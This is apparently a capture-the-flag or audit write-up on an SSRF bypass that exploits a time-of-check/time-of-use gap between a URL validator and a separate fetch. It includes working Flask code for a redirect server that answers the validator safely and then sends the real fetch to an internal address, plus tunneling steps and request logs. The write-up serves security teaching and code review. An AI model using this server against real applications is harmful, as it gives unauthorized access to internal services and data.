
Reading the source code we can see , two separate HTTP clients hit the same URL at two different moments. Validation result from Client A is trusted blindly for Client B’s fetch — but nothing guarantees the destination answers the same way twice

```
su.execute(url)          # Client A validates the URL (follows redirects itself)
r = requests.get(url)    # Client B fetches the SAME url — zero validation
```


Why standard payloads fail here,

Every static payload — IP encodings, `127.1`, hex/octal, DNS tricks — gets caught because Client A (the validator) actually visits the URL and checks what it resolves to / redirects to. A static malicious destination is caught at validation time, every time.

#### The exploit: make your own server lie based on request order

```
Request #1 (validator visits) → respond SAFE (200, no redirect)
Request #2 (real fetch visits) → NOW redirect to the real internal target
```


1. Write the two-faced redirect server
```
import flask
app = flask.Flask(__name__)

req_no = 1

@app.route('/')
def home():
    global req_no
    if req_no == 1:
        req_no += 1
        return "Hello World!"
    return flask.redirect("http://127.0.0.1:1337/secret", code=302)

app.run(port=5000)
```


Swap `127.0.0.1:1337/secret` for whatever internal target you’re after.

2. Run it

```bash
python3 server.py
```

3. Expose it publicly** (target server needs to reach it over the internet)
```
npm install -g localtunnel
npx lt -p 5000
```

Copy the printed URL (e.g. `https://xyz.loca.lt`).

4. **Visit the tunnel URL once yourself in a browser**  
Clears localtunnel’s “click to continue” interstitial so it doesn’t eat the target’s first real hit.

5. Submit the tunnel URL into the vulnerable app’s input field**  
Whatever form/parameter triggers the validate-then-fetch flow.

6. Watch your terminal for exactly 2 incoming requests**

```
GET / HTTP/1.1 200 ← validator, got "Hello World!"
GET / HTTP/1.1 302 ← real fetch, got redirected to internal target
```


#### Methodology takeaway for source review

When auditing code that uses a URL-safety library:

- [ ]  Does validation happen via a separate call/client from the actual fetch?
- [ ]  If yes — the gap between them is a potential TOCTOU, regardless of how strong the validator’s pattern matching is
- [ ]  Test by building a destination you control that changes behavior across requests, rather than fuzzing static bypass payloads

